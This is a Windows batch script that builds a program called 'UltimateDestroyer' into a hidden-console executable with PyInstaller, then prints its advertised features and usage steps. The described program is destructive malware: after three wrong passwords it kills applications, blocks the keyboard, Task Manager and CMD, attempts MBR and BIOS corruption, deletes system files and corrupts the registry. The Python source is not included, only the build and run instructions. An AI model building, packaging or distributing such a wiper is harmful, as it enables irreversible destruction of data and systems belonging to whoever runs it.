@echo off
echo ===========================================
echo   BUILD ULTIMATE DESTROYER - 3 IN 1
echo ===========================================
echo.

echo 🔧 INSTALLING DEPENDENCIES...
echo.
pip install pyinstaller pywin32 psutil

echo.
echo 🚀 BUILDING ULTIMATE DESTROYER EXE...
echo.
python -m PyInstaller --onefile --noconsole ^
--name "UltimateDestroyer" ^
--add-data ".;." ^
--hidden-import win32api ^
--hidden-import win32con ^
--hidden-import win32process ^
--hidden-import win32gui ^
--hidden-import winreg ^
--hidden-import psutil ^
"UltimateDestroyer.py"

echo.
if exist dist\UltimateDestroyer.exe (
    copy dist\UltimateDestroyer.exe .
    echo ✅ UltimateDestroyer.exe BUILT SUCCESSFULLY!
    echo.
    echo 📊 FILE INFO:
    for /f "tokens=*" %%i in ('dir UltimateDestroyer.exe ^| find "UltimateDestroyer.exe"') do echo   %%i
) else (
    echo ❌ BUILD FAILED!
    echo Check Python and PyInstaller installation
)

echo.
echo ===========================================
echo   🎯 ULTIMATE DESTROYER FEATURES:
echo ===========================================
echo.
echo 1️⃣ PYTHON FRAMEWORK:
echo    • Fullscreen hacker interface
echo    • Password: destroy123
echo    • 3 attempts → Complete destruction
echo    • Terminal simulation
echo.
echo 2️⃣ C++-STYLE FEATURES:
echo    • Kill all applications (chrome, firefox, etc.)
echo    • Block Windows shortcuts
echo    • Disable Task Manager & CMD
echo    • Process creation blocking
echo.
echo 3️⃣ GO-STYLE FEATURES:
echo    • MBR/Bootloader destruction
echo    • BIOS corruption attempts
echo    • System file deletion
echo    • Registry corruption
echo    • Force system restart
echo.
echo ===========================================
echo   🚀 USAGE INSTRUCTIONS:
echo ===========================================
echo 1. Run UltimateDestroyer.exe (as Admin)
echo 2. Enter password: destroy123
echo 3. 3x wrong password = DESTRUCTION ACTIVATED
echo 4. System will:
echo    - Kill all apps
echo    - Block keyboard
echo    - Corrupt MBR/BIOS
echo    - Delete system files
echo    - Force restart
echo.
echo ⚠️  TEST IN VIRTUALBOX WITH SNAPSHOT!
echo.
echo 📁 SINGLE FILE: UltimateDestroyer.exe
echo   (All 3 frameworks integrated)
echo.
pause